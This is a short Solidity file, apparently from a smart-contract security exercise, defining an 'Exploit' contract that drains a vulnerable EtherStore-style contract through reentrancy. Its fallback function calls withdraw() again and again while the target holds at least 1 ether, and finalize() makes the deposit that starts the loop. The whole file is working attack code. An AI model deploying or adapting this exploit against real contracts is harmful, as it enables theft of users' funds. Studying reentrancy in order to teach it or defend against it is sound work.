pragma solidity 0.8.4;

import './ExampleQuizExploit.sol';

contract Exploit {
    ExampleQuizExploit public etherStore;

    constructor(address _etherStoreAddress) {
        etherStore = ExampleQuizExploit(_etherStoreAddress);
    }

    // Fallback is called when EtherStore sends Ether to this contract.
    fallback() external payable {
        if (address(etherStore).balance >= 1 ether) {
            etherStore.withdraw();
        }
    }

    function finalize() external payable {
        require(msg.value >= 0 ether );
        etherStore.deposit{value: 1 ether}();
        etherStore.withdraw();
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}